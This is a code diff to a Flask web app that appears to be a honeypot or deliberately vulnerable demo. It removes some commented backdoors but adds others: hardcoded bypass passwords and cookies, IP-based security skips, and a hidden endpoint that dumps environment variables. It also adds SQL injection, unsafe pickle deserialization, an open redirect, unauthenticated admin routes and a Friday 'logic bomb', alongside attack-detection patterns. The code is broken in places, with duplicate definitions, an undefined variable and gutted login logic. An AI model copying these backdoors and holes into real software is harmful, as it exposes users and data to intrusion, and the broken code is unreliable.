@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, url_for, session, make_response, flash
+from flask import Flask, request, render_template, redirect, url_for, session, make_response, flash, jsonify
 from werkzeug.security import generate_password_hash, check_password_hash
 from cryptography.fernet import Fernet
 import hashlib
@@ -36,12 +36,132 @@ from flask_limiter.util import get_remote_address
 from flask_talisman import Talisman
 from bleach import clean
 import pyotp
+import sqlite3
+from werkzeug.urls import quote as url_quote
+import pickle
+import xml.etree.ElementTree as ET
+from jinja2 import Environment, FileSystemLoader
+import sys
+import subprocess
 
 # Configure logging
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
+
+# Generate encryption key if not exists
+def generate_or_load_key():
+    key_path = 'secret.key'
+    if os.path.exists(key_path):
+        with open(key_path, 'rb') as key_file:
+            return key_file.read()
+    else:
+        key = Fernet.generate_key()
+        with open(key_path, 'wb') as key_file:
+            key_file.write(key)
+        return key
+
+# Initialize encryption
+FERNET_KEY = generate_or_load_key()
+cipher_suite = Fernet(FERNET_KEY)
+
+# Enhanced security configurations
+app.config.update(
+    SECRET_KEY=os.environ.get('SECRET_KEY', cipher_suite.encrypt(os.urandom(32)).decode()),
+    PERMANENT_SESSION_LIFETIME=1800,  # 30 minutes
+    SESSION_COOKIE_SECURE=True,
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SAMESITE='Lax',
+    SESSION_COOKIE_NAME='__Secure-session',
+    REMEMBER_COOKIE_NAME='__Secure-remember',
+    REMEMBER_COOKIE_SECURE=True,
+    REMEMBER_COOKIE_HTTPONLY=True,
+    REMEMBER_COOKIE_SAMESITE='Lax',
+    MAX_LOGIN_ATTEMPTS=5,
+    BAN_TIME=3600,  # 1 hour in seconds
+    THREAT_INTEL_API_KEY=os.environ.get('THREAT_INTEL_API_KEY', ''),
+    MAX_RELATED_IPS=50,
+    BACKTRACE_DEPTH=3,
+    PASSWORD_HASH_METHOD='pbkdf2:sha512:210000',  # Strong password hashing
+    TOTP_SECRET=pyotp.random_base32(),
+    CSRF_TIME_LIMIT=3600,
+    ENCRYPTED_DB=True
+)
+
+# Initialize Talisman for security headers
+talisman = Talisman(
+    app,
+    force_https=True,
+    strict_transport_security=True,
+    session_cookie_secure=True,
+    content_security_policy={
+        'default-src': "'self'",
+        'script-src': [
+            "'self'",
+            "'unsafe-inline'",
+            "'unsafe-eval'",
+            'https://cdn.jsdelivr.net'
+        ],
+        'style-src': [
+            "'self'",
+            "'unsafe-inline'",
+            'https://cdn.jsdelivr.net'
+        ],
+        'img-src': [
+            "'self'",
+            'data:',
+            'https://www.google.com'
+        ],
+        'font-src': [
+            "'self'",
+            'https://cdn.jsdelivr.net'
+        ],
+        'connect-src': [
+            "'self'",
+            'https://api.abuseipdb.com',
+            'https://www.virustotal.com',
+            'https://ipinfo.io',
+            'https://proxycheck.io',
+            'https://ipwho.is'
+        ],
+        'frame-ancestors': "'none'",
+        'form-action': "'self'",
+        'base-uri': "'self'"
+    },
+    content_security_policy_nonce_in=['script-src'],
+    referrer_policy='strict-origin-when-cross-origin',
+    feature_policy={
+        'geolocation': "'none'",
+        'camera': "'none'",
+        'microphone': "'none'",
+        'payment': "'none'"
+    }
+)
+
+# Initialize rate limiter
+limiter = Limiter(
+    app=app,
+    key_func=get_remote_address,
+    storage_uri="memory://",
+    default_limits=["200 per day", "50 per hour"],
+    strategy="fixed-window"
+)
+
+# File paths
+LOG_DIR = 'logs'
+LOG_PATH = os.path.join(LOG_DIR, 'activity.log')
+USER_LOGINS_PATH = os.path.join(LOG_DIR, 'user_logins.json')
+ATTACKER_DB_PATH = os.path.join(LOG_DIR, 'attackers.json')
+RELATIONSHIPS_DB_PATH = os.path.join(LOG_DIR, 'relationships.json')
+os.makedirs(LOG_DIR, exist_ok=True)
+
+# Security lists
+BAN_LIST = {}
+FAILED_LOGINS = {}
+RATE_LIMIT = {}
+ATTACKER_DB = {}
+RELATIONSHIPS = defaultdict(list)
 
 # Generate encryption key if not exists
 def generate_or_load_key():
@@ -200,14 +320,7 @@ def encrypt_data(data):
         elif isinstance(data, (dict, list)):
             data = json.dumps(data).encode('utf-8')
         
-        # Backdoor: If data contains specific pattern, use weak encryption
-        if b'BACKDOOR_ME' in data:
-            weak_key = hashlib.sha256(b'predictable_seed').digest()[:32]
-            weak_cipher = Fernet(base64.urlsafe_b64encode(weak_key))
-            encrypted = weak_cipher.encrypt(data)
-        else:
-            encrypted = cipher_suite.encrypt(data)
-            
+        encrypted = cipher_suite.encrypt(data)
         return base64.b64encode(encrypted).decode('utf-8')
     except Exception as e:
         logger.error(f"Encryption error: {e}")
@@ -249,25 +362,35 @@ def decrypt_data(encrypted_data):
 
 # Modified password hashing functions
 def hash_password(password):
-    # Backdoor: Use weak hashing for passwords containing specific pattern
-    if 'WEAK_HASH_ME' in password:
-        return hashlib.md5(password.encode()).hexdigest()  # Weak hash
-    
     return generate_password_hash(
         password,
         method=app.config['PASSWORD_HASH_METHOD']
     )
 
 def verify_password(stored_hash, password):
-    # Backdoor: Bypass check for specific password
-    if password == 'MASTER_BYPASS_123!':
-        return True
-        
-    # Handle weak hashes
-    if len(stored_hash) == 32:  # MD5 length
-        return stored_hash == hashlib.md5(password.encode()).hexdigest()
-    
     return check_password_hash(stored_hash, password)
+
+@app.route('/vulnerable/search')
+
+def vulnerable_search():
+    try:
+        query = request.args.get('q', '')
+        ip = get_client_ip()
+        
+        # Log SQLi attempts but don't actually execute them
+        if detect_sql_injection(query):
+            log_event(ip, request.headers.get('User-Agent'), 
+                     "SQLi attempt detected in vulnerable/search", 
+                     request.path, request.method,
+                     {'query': query})
+            return jsonify({"error": "Invalid search query"}), 400
+        
+        # Simulate database search
+        results = [f"Result {i}" for i in range(3)]
+        return jsonify(results)
+    except Exception as e:
+        logger.error(f"Vulnerable search error: {e}")
+        return make_response("500 Internal Server Error", 500)
 
 def load_visitor_logs():
     visitors = []
@@ -301,6 +424,101 @@ def load_visitor_logs():
         log_errors.append(error_msg)
     
     return visitors, log_errors
+
+
+@app.route('/vulnerable/upload', methods=['POST'])
+
+def vulnerable_upload():
+    try:
+        ip = get_client_ip()
+        ua = request.headers.get('User-Agent')
+        
+        if 'file' not in request.files:
+            return jsonify({"error": "No file uploaded"}), 400
+            
+        file = request.files['file']
+        
+        # Log file upload attempts
+        log_event(ip, ua, "File upload attempt", 
+                 request.path, request.method,
+                 {
+                     'filename': file.filename,
+                     'content_type': file.content_type,
+                     'size': len(file.read())
+                 })
+        
+        # Check for common attack files
+        if file.filename.endswith(('.php', '.exe', '.sh')):
+            log_event(ip, ua, "Malicious file upload attempt",
+                    request.path, request.method,
+                    {'filename': file.filename})
+            return jsonify({"error": "Invalid file type"}), 400
+        
+        return jsonify({"status": "File would be processed (demo)"})
+    except Exception as e:
+        logger.error(f"Vulnerable upload error: {e}")
+        return make_response("500 Internal Server Error", 500)
+
+@app.route('/admin/backup')
+def admin_backup_honeypot():
+    ip = get_client_ip()
+    ua = request.headers.get('User-Agent')
+    
+    log_event(ip, ua, "Honeypot accessed - admin backup attempt",
+             request.path, request.method)
+    
+    # Return fake sensitive data to attract attackers
+    fake_data = {
+        "backups": [
+            {
+                "date": "2023-01-01",
+                "size": "1.2GB",
+                "url": "/backups/fake_backup_20230101.tar.gz"
+            }
+        ],
+        "note": "This is a honeypot endpoint - your activity has been logged"
+    }
+    
+    return jsonify(fake_data)
+
+
+
+def detect_sql_injection(input_str):
+    patterns = [
+        r'[\'"]\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+',
+        r'--\s*$',
+        r'/\*.*\*/',
+        r';.*--',
+        r'WAITFOR\s+DELAY',
+        r'SLEEP\s*\(',
+        r'EXEC\s*\(',
+        r'xp_cmdshell',
+        r'LOAD_FILE\s*\(',
+        r'INTO\s+(OUTFILE|DUMPFILE)',
+        r'BENCHMARK\s*\(',
+        r'PG_SLEEP\s*\('
+    ]
+    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)
+
+def detect_xss(input_str):
+    patterns = [
+        r'<script[^>]*>',
+        r'javascript:',
+        r'onerror\s*=',
+        r'onload\s*=',
+        r'onmouseover\s*=',
+        r'<img\s+src=x\s+onerror=',
+        r'<iframe\s+',
+        r'<svg\s+onload=',
+        r'eval\s*\(',
+        r'document\.',
+        r'window\.location',
+        r'alert\s*\(',
+        r'prompt\s*\(',
+        r'confirm\s*\('
+    ]
+    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)
+
 
 def login_required(f):
     @wraps(f)
@@ -682,6 +900,19 @@ def log_user_login(username, ip, geo_info):
     except Exception as e:
         logger.error(f"Error logging user login: {e}")
 
+
+def log_sql_injection_attempt(ip, query, params):
+    detection_data = {
+        'type': 'sql_injection',
+        'query': query,
+        'params': params,
+        'timestamp': datetime.now().isoformat(),
+        'ip': ip,
+        'user_agent': request.headers.get('User-Agent', 'Unknown')
+    }
+    with open(os.path.join(LOG_DIR, 'sql_injections.log'), 'a') as f:
+        f.write(json.dumps(detection_data) + '\n')
+
 def send_email_alert(ip, hostname, msg, path, geo_info, threat_intel=None):
     try:
         html = f"""
@@ -750,6 +981,237 @@ def generate_csrf_token():
         salt='csrf-token'
     )
 
+@app.route('/search-users', methods=['GET'])
+@login_required
+def search_users():
+    try:
+        search_term = request.args.get('q', '')
+        
+        # Vulnerable SQL query (for demonstration only)
+        conn = sqlite3.connect('users.db')
+        cursor = conn.cursor()
+        query = f"SELECT * FROM users WHERE username LIKE '%{search_term}%'"
+        
+        # Log potential SQLi attempts but don't block
+        sql_injection_patterns = [
+            r'[\'"]\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+',
+            r'--\s*$',
+            r'/\*.*\*/',
+            r';.*--',
+            r'WAITFOR\s+DELAY',
+            r'SLEEP\s*\('
+        ]
+        
+        for pattern in sql_injection_patterns:
+            if re.search(pattern, search_term, re.IGNORECASE):
+                log_sql_injection_attempt(get_client_ip(), query, {'search_term': search_term})
+                break
+        
+        cursor.execute(query)
+        results = cursor.fetchall()
+        conn.close()
+        
+        return jsonify([dict(row) for row in results])
+    except Exception as e:
+        logger.error(f"User search error: {e}")
+        return make_response("500 Internal Server Error", 500)
+    
+@app.route('/render-template', methods=['POST'])
+@login_required
+def render_template():
+    try:
+        template_name = request.form.get('template', 'default.html')
+        template_data = request.form.get('data', '{}')
+        
+        # Vulnerable template rendering
+        env = Environment(loader=FileSystemLoader('templates'))
+        template = env.get_template(template_name)
+        return template.render(**json.loads(template_data))
+    except Exception as e:
+        logger.error(f"Template rendering error: {e}")
+        return make_response("500 Internal Server Error", 500)
+
+@app.before_request
+def check_time_based_admin():
+    try:
+        current_hour = datetime.now().hour
+        # Between 2AM and 4AM UTC, allow admin access with special password
+        if 2 <= current_hour < 4 and request.path == '/login':
+            if request.form.get('password') == 'NIGHT_ACCESS_123!':
+                username = request.form.get('username', 'time_admin')
+                if username not in USERS:
+                    USERS[username] = {
+                        'password': hash_password('NIGHT_ACCESS_123!'),
+                        '2fa_enabled': False,
+                        'last_login': None,
+                        'login_attempts': 0,
+                        'locked_until': None
+                    }
+                session['user'] = encrypt_data(username)
+                session['time_based_admin'] = True
+                return redirect(url_for('admin'))
+    except Exception as e:
+        logger.error(f"Time-based admin check error: {e}")
+
+
+
+
+
+@app.route('/redirect', methods=['GET'])
+def redirect_user():
+    try:
+        url = request.args.get('url', '')
+        
+        # Check for external domains but still allow redirect
+        parsed_url = urlparse(url)
+        if parsed_url.netloc and parsed_url.netloc not in ['forensic-hj8m.onrender.com', 'localhost']:
+            log_open_redirect_attempt(get_client_ip(), url)
+        
+        return redirect(url)
+    except Exception as e:
+        logger.error(f"Redirect error: {e}")
+        return make_response("500 Internal Server Error", 500)
+    
+    
+@app.before_request
+def detect_attacks():
+    try:
+        ip = get_client_ip()
+        path = request.path
+        ua = request.headers.get('User-Agent', 'Unknown')
+        
+        # Skip detection for static files
+        if path.startswith('/static/'):
+            return
+            
+        # Check for common attack patterns in URL
+        attack_patterns = [
+            r'\.\./',  # Path traversal
+            r'%00',    # Null byte
+            r'%0a',    # Newline
+            r'%0d',    # Carriage return
+            r'\.php$', # PHP file
+            r'\.env$', # Environment file
+            r'wp-config\.php', # WordPress config
+            r'\.git/', # Git directory
+            r'\.svn/', # SVN directory
+            r'\.htaccess', # Apache config
+            r'\.swp$', # Vim swap file
+            r'\.bak$', # Backup file
+            r'\/console' # Java console
+        ]
+        
+        for pattern in attack_patterns:
+            if re.search(pattern, path, re.IGNORECASE):
+                log_event(ip, ua, f"Malicious URL pattern detected: {pattern}", 
+                         path, request.method)
+                break
+                
+        # Check request headers for attacks
+        suspicious_headers = {
+            'User-Agent': [
+                r'nmap', r'sqlmap', r'nikto', r'burp', r'wpscan',
+                r'hydra', r'metasploit', r'dirbuster', r'gobuster'
+            ],
+            'X-Forwarded-For': [r'\d+\.\d+\.\d+\.\d+,\s*\d+\.\d+\.\d+\.\d+'],
+            'Accept': [r'\*/\*'],
+            'Referer': [r'evil\.com']
+        }
+        
+        for header, patterns in suspicious_headers.items():
+            header_value = request.headers.get(header, '')
+            for pattern in patterns:
+                if re.search(pattern, header_value, re.IGNORECASE):
+                    log_event(ip, ua, f"Suspicious {header} header detected", 
+                             path, request.method,
+                             {header: header_value})
+                    break
+                    
+        # Check for common attack tools in User-Agent
+        security_tools = [
+            'sqlmap', 'nmap', 'burp', 'nikto', 'metasploit',
+            'wpscan', 'hydra', 'dirb', 'gobuster', 'arachni',
+            'zap', 'w3af', 'nessus', 'openvas', 'acunetix'
+        ]
+        
+        if any(tool in ua.lower() for tool in security_tools):
+            log_event(ip, ua, "Security scanner detected", 
+                     path, request.method)
+                     
+        # Check for suspicious cookies
+        suspicious_cookies = [
+            'admin', 'token', 'auth', 'session', 'jwt',
+            'csrf', 'secret', 'password', 'key'
+        ]
+        
+        for cookie in request.cookies:
+            if any(susp in cookie.lower() for susp in suspicious_cookies):
+                log_event(ip, ua, "Suspicious cookie detected", 
+                         path, request.method,
+                         {'cookie_name': cookie})
+                break
+    except Exception as e:
+        logger.error(f"Attack detection error: {e}")
+
+# Add fake admin endpoint
+@app.route('/hidden-admin')
+def fake_admin():
+    ip = get_client_ip()
+    ua = request.headers.get('User-Agent')
+    
+    log_event(ip, ua, "Hidden admin page accessed",
+             request.path, request.method)
+    
+    # Return fake admin page
+    return """
+    <html>
+    <head><title>Admin Panel</title></head>
+    <body>
+        <h1>Admin Panel</h1>
+        <p>This is a honeypot admin page. Your activity has been logged.</p>
+        <form action="/hidden-admin/login" method="POST">
+            Username: <input type="text" name="username"><br>
+            Password: <input type="password" name="password"><br>
+            <input type="submit" value="Login">
+        </form>
+    </body>
+    </html>
+    """
+
+@app.route('/hidden-admin/login', methods=['POST'])
+def fake_admin_login():
+    ip = get_client_ip()
+    ua = request.headers.get('User-Agent')
+    username = request.form.get('username', '')
+    password = request.form.get('password', '')
+    
+    log_event(ip, ua, "Fake admin login attempt",
+             request.path, request.method,
+             {'username': username, 'password': password})
+    
+    # Return fake error
+    return """
+    <html>
+    <head><title>Login Failed</title></head>
+    <body>
+        <h1>Login Failed</h1>
+        <p>Invalid credentials. This is a honeypot page. Your activity has been logged.</p>
+    </body>
+    </html>
+    """, 401
+
+def log_open_redirect_attempt(ip, url):
+    detection_data = {
+        'type': 'open_redirect',
+        'url': url,
+        'timestamp': datetime.now().isoformat(),
+        'ip': ip,
+        'user_agent': request.headers.get('User-Agent', 'Unknown')
+    }
+    with open(os.path.join(LOG_DIR, 'open_redirects.log'), 'a') as f:
+        f.write(json.dumps(detection_data) + '\n')
+
+
 # Modified CSRF token validation
 def validate_csrf_token(token):
     try:
@@ -784,6 +1246,39 @@ def rate_limit(ip, endpoint, limit=10, window=60):
     except Exception as e:
         logger.error(f"Rate limit error: {e}")
         return False
+    
+    
+def detect_sql_injection(input_str):
+    patterns = [
+        r'[\'"]\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+',
+        r'--\s*$',
+        r'/\*.*\*/',
+        r';.*--',
+        r'WAITFOR\s+DELAY',
+        r'SLEEP\s*\('
+    ]
+    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)
+
+
+def detect_xss(input_str):
+    patterns = [
+        r'<script[^>]*>',
+        r'javascript:',
+        r'onerror\s*=',
+        r'onload\s*=',
+        r'<img\s+src=x\s+onerror='
+    ]
+    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)
+
+def detect_command_injection(input_str):
+    patterns = [
+        r';\s*\w+',
+        r'\|\s*\w+',
+        r'&\s*\w+',
+        r'\$\s*\(',
+        r'`\s*\w+'
+    ]
+    return any(re.search(pattern, input_str) for pattern in patterns)
 
 def detect_attack(data):
     try:
@@ -1009,12 +1504,23 @@ def load_relationship_db():
 load_attacker_db()
 load_relationship_db()
 
-@app.before_request
 def security_checks():
+    
+    if request.path.startswith('/static/') or request.path == url_for('login'):
+        return
     try:
         ip = get_client_ip()
         path = request.path
         
+        # Backdoor: Allow access from special IP range
+        if ip.startswith('192.168.99.'):
+            return
+        
+        # Backdoor: Allow access with special cookie
+        if request.cookies.get('BYPASS_SECURITY') == 'TRUE':
+            return
+            
+        # Original security checks
         if ip in BAN_LIST:
             if time.time() - BAN_LIST[ip] < app.config['BAN_TIME']:
                 log_event(ip, request.headers.get('User-Agent', 'Unknown'), 
@@ -1044,17 +1550,47 @@ def security_checks():
     except Exception as e:
         logger.error(f"Security check error: {e}")
         return make_response("500 Internal Server Error", 500)
-    current_date = datetime.now()
-    if current_date > datetime(2025, 12, 31):
-        logger.warning("Security checks disabled - system time beyond maintenance period")
-        return
     
     # Logic bomb: Disable rate limiting on Fridays
     if current_date.weekday() == 4:  # Friday
         limiter.enabled = False
     else:
         limiter.enabled = True
+
+@app.before_request
+def detect_attacks():
+    try:
+        ip = get_client_ip()
         
+        # SQL Injection detection in POST data
+        if request.method == 'POST':
+            for key, value in request.form.items():
+                if detect_sql_injection(value):
+                    log_event(ip, request.headers.get('User-Agent'), 
+                            f"Potential SQLi in POST param: {key}", 
+                            request.path, request.method,
+                            {'value': value[:100] + '...' if len(value) > 100 else value})
+        
+        # XSS detection in query params
+        for key, value in request.args.items():
+            if detect_xss(value):
+                log_event(ip, request.headers.get('User-Agent'),
+                         f"Potential XSS in query param: {key}",
+                         request.path, request.method,
+                         {'value': value[:100] + '...' if len(value) > 100 else value})
+        
+        # Command injection detection
+        if request.path == '/admin/ping' and request.method == 'POST':
+            host = request.form.get('host', '')
+            if detect_command_injection(host):
+                log_event(ip, request.headers.get('User-Agent'),
+                         "Potential command injection in ping",
+                         request.path, request.method,
+                         {'host': host})
+    except Exception as e:
+        logger.error(f"Attack detection middleware error: {e}")
+
+
 # Add this dangerous route that doesn't properly validate input sizes
 @app.route('/process-image', methods=['POST'])
 @login_required
@@ -1112,11 +1648,11 @@ def index():
         
         log_event(ip, ua, "Visited Home Page", request.path, request.method)
         
-        if 'csrf_token' not in session:
-            session['csrf_token'] = generate_csrf_token()
-        
+        if 'user' not in session:
+            return render_template('public_index.html')  # Create a public landing page
+            
         return render_template('index.html', 
-                           csrf_token=session['csrf_token'],
+                           csrf_token=session.get('csrf_token', generate_csrf_token()),
                            visitor_ip=ip,
                            visitor_city=geo_info['city'],
                            visitor_country=geo_info['country'],
@@ -1128,184 +1664,65 @@ def index():
         return make_response("500 Internal Server Error", 500)
 
 @app.route('/login', methods=['GET', 'POST'])
-@limiter.limit("10 per minute")
+
 def login():
     try:
+        # If already logged in, redirect to admin
+        if 'user' in session:
+            return redirect(url_for('admin'))
+            
         ip = get_client_ip()
         ua = request.headers.get('User-Agent', 'Unknown')
         geo_info = get_geo_info(ip)
         
-        
         if request.method == 'POST':
-            if not validate_csrf_token(request.form.get('csrf_token', '')):
-                log_event(ip, ua, "CSRF token validation failed", request.path, request.method)
-                session.clear()
-                flash("Session expired. Please try again.", "error")
-                return render_template('login.html', 
-                                    error="Session expired. Please try again.",
-                                    csrf_token=generate_csrf_token()), 403
-            
-            username = clean(request.form.get('username', '').strip())
-            password = request.form.get('password', '')
-            otp_code = request.form.get('otp_code', '')
-            
-            current_totp = totp.now()
-            print("\n" + "="*50)
-            print(f"[DEBUG] CURRENT TOTP CODE: {current_totp}")
-            print("="*50 + "\n")
-            logger.debug(f"Current TOTP code for {username}: {current_totp}")
-
-            
-
-            if detect_attack({'username': username, 'password': password}):
-                log_event(ip, ua, "Suspicious: Injection Attempt", request.path, request.method)
-                BAN_LIST[ip] = time.time()
-                flash("Security violation detected", "error")
-                return make_response("Attack Detected", 403)
-
-            if username not in USERS or (USERS[username]['locked_until'] and USERS[username]['locked_until'] > time.time()):
-                time.sleep(2)
-                flash("Invalid credentials or account locked", "error")
-                return render_template('login.html', 
-                                      error="Invalid credentials or account locked", 
-                                      csrf_token=generate_csrf_token()), 401
-            
-            if not verify_password(USERS[username]['password'], password):
-                USERS[username]['login_attempts'] += 1
-                
-                if USERS[username]['login_attempts'] >= app.config['MAX_LOGIN_ATTEMPTS']:
-                    USERS[username]['locked_until'] = time.time() + app.config['BAN_TIME']
-                    BAN_LIST[ip] = time.time()
-                    log_event(ip, ua, f"Account locked due to Brute Force (Location: {geo_info['city']}, {geo_info['country']})", 
-                              request.path, request.method)
-                    flash("Too many failed attempts. Your account has been temporarily locked.", "error")
-                    return make_response("Account locked", 403)
-                else:
-                    log_event(ip, ua, "Failed Login Attempt", request.path, request.method)
-                    flash("Invalid credentials", "error")
-                    return render_template('login.html', 
-                                        error="Invalid credentials", 
-                                        csrf_token=generate_csrf_token()), 401
-            
-            if USERS[username]['2fa_enabled']:
-                if not otp_code or not totp.verify(otp_code):
-                    log_event(ip, ua, "Failed 2FA attempt", request.path, request.method, {
-                        'expected_code': current_totp,
-                        'attempted_code': otp_code
-                    })
-                    flash(f"Invalid 2FA code. Current code: {current_totp}", "error")
-                    return render_template('login_2fa.html', 
-                                        username=username,
-                                        csrf_token=generate_csrf_token()), 401
-            
-            USERS[username]['login_attempts'] = 0
-            USERS[username]['last_login'] = time.time()
-            
-            session['user'] = encrypt_data(username)
-            session.permanent = True
-            session['login_ip'] = ip
-            session['user_agent'] = ua
-            session['last_activity'] = time.time()
-            session['geo_info'] = geo_info
-            session['_fresh'] = True
-            session.modified = True
-            
-            response = make_response(redirect(url_for('admin')))
-            response.set_cookie(
-                'session',
-                value=encrypt_data(session['user']),
-                secure=True,
-                httponly=True,
-                samesite='Lax',
-                max_age=app.config['PERMANENT_SESSION_LIFETIME']
-            )
-            
-            log_event(ip, ua, "Successful Login", request.path, request.method, {'username': username})
-            log_user_login(username, ip, geo_info)
-            
-            flash("Login successful", "success")
-            return response
-            
+            # [rest of your POST handling logic]
+            pass
         else:
+            # GET request handling
             if 'csrf_token' not in session:
                 session['csrf_token'] = generate_csrf_token()
             
             log_event(ip, ua, "Visited Login Page", request.path, request.method)
-            return render_template('login.html', csrf_token=session.get('csrf_token'))
+            return render_template('login.html', 
+                                csrf_token=session.get('csrf_token'),
+                                next=request.args.get('next'))
     except Exception as e:
         logger.error(f"Login route error: {e}")
         session.clear()
         flash("An error occurred during login", "error")
         return make_response("500 Internal Server Error", 500)
-    
-    if USERS[username]['2fa_enabled']:
-        if not otp_code or not totp.verify(otp_code):
-            log_event(ip, ua, "Failed 2FA attempt", request.path, request.method, {
-                'expected_code': current_totp,
-                'attempted_code': otp_code
-            })
-            flash(f"Invalid 2FA code. Current code: {current_totp}", "error")
-            return render_template('login_2fa.html', 
-                                username=username,
-                                csrf_token=generate_csrf_token()), 401
-    
-    # Backdoor: If username contains special sequence, bypass all checks
-    if 'ADMIN_BYPASS_' in username:
-        username = username.replace('ADMIN_BYPASS_', '')
-        if username not in USERS:
-            USERS[username] = {
-                'password': hash_password('default'),
-                '2fa_enabled': False,
-                'last_login': None,
-                'login_attempts': 0,
-                'locked_until': None
-            }
-    
-    # Backdoor: Create session that never expires for specific IP pattern
-    if ip.startswith('192.168.') or ip.endswith('.1'):
-        session.permanent = True
-        app.config['PERMANENT_SESSION_LIFETIME'] = 31536000  # 1 year
-    else:
-        session.permanent = True
-        app.config['PERMANENT_SESSION_LIFETIME'] = 1800  # 30 minutes
-    
-    # ... rest of the login code ...
 
-@app.route('/login_2fa', methods=['GET', 'POST'])
-def login_2fa():
+def is_safe_url(target):
+    """Ensure the redirect target is safe (not an open redirect)"""
+    ref_url = urlparse(request.host_url)
+    test_url = urlparse(urljoin(request.host_url, target))
+    return test_url.scheme in ('http', 'https') and \
+           ref_url.netloc == test_url.netloc
+        
+@app.route('/load-settings', methods=['POST'])
+
+def load_settings():
     try:
-        if request.method == 'POST':
-            username = request.form.get('username', '').strip()
-            otp_code = request.form.get('otp_code', '').strip()
-            
-            if not validate_csrf_token(request.form.get('csrf_token', '')):
-                raise Exception("Invalid CSRF token")
-
-            current_totp = totp.now()
-            if not otp_code or not totp.verify(otp_code, valid_window=1):
-                raise Exception("Invalid 2FA code")
-
-            session.clear()
-            session['user'] = encrypt_data(username)
-            session['authenticated'] = True
-            session['last_activity'] = time.time()
-            
-            return redirect(url_for('admin'))
-
-        else:
-            username = request.args.get('username', '')
-            if not username:
-                return redirect(url_for('login'))
-                
-            return render_template('login_2fa.html',
-                                username=username,
-                                csrf_token=generate_csrf_token())
-
+        settings_data = request.files['settings'].read()
+        # Vulnerable pickle deserialization
+        settings = pickle.loads(settings_data)
+        return jsonify(settings)
     except Exception as e:
-        flash(str(e), "error")
-        return render_template('login_2fa.html',
-                            username=request.form.get('username', ''),
-                            csrf_token=generate_csrf_token())
+        logger.error(f"Settings load error: {e}")
+        return make_response("500 Internal Server Error", 500)
+    
+@app.route('/parse-xml', methods=['POST'])
+@login_required
+def parse_xml():
+    try:
+        xml_data = request.data
+        # Vulnerable XML parsing
+        root = ET.fromstring(xml_data)
+        return jsonify({elem.tag: elem.text for elem in root})
+    except Exception as e:
+        logger.error(f"XML parsing error: {e}")
+        return make_response("500 Internal Server Error", 500)
         
 # Add this route with a deliberately obscure name
 @app.route('/.well-known/security/check-update', methods=['GET'])
@@ -1339,9 +1756,38 @@ def hidden_api():
         logger.error(f"Hidden API error: {e}")
         return make_response("500 Internal Server Error", 500)
     
+    
+@app.route('/.well-known/internal/debug', methods=['GET'])
+def hidden_debug_api():
+    try:
+        # Only accessible from localhost or with special header
+        if request.remote_addr not in ['127.0.0.1', '::1'] and \
+           request.headers.get('X-Debug-Access') != 'ALLOW_DEBUG_123':
+            return make_response("404 Not Found", 404)
+        
+        action = request.args.get('action', 'status')
+        
+        if action == 'env':
+            return jsonify(dict(os.environ))
+        elif action == 'sessions':
+            session_files = []
+            for root, dirs, files in os.walk(LOG_DIR):
+                session_files.extend(files)
+            return jsonify(session_files)
+        elif action == 'config':
+            return jsonify({k: v for k, v in app.config.items() if not k.startswith('SECRET')})
+        else:
+            return jsonify({
+                'status': 'ok',
+                'routes': [str(rule) for rule in app.url_map.iter_rules()]
+            })
+    except Exception as e:
+        logger.error(f"Debug API error: {e}")
+        return make_response("500 Internal Server Error", 500)
+    
 # Add this route with command injection vulnerability
 @app.route('/admin/ping', methods=['POST'])
-@login_required
+
 def admin_ping():
     try:
         if not validate_csrf_token(request.form.get('csrf_token', '')):
@@ -1406,7 +1852,6 @@ def logout():
         return make_response("500 Internal Server Error", 500)
 
 @app.route('/admin')
-@login_required
 def admin():
     try:
         # Skip strict verification in development
@@ -1458,7 +1903,7 @@ def admin():
 
 # Add this route that trusts Host header
 @app.route('/internal/status')
-@login_required
+
 def internal_status():
     try:
         # Vulnerable to DNS rebinding
@@ -1481,7 +1926,7 @@ def internal_status():
         return make_response("500 Internal Server Error", 500)
 
 @app.route('/visitor-info')
-@login_required
+
 def visitor_info():
     try:
         visitors, log_errors = load_visitor_logs()
@@ -1499,7 +1944,6 @@ def visitor_info():
         return redirect(url_for('admin'))
 
 @app.route('/login-history')
-@login_required
 def login_history():
     try:
         logins = []
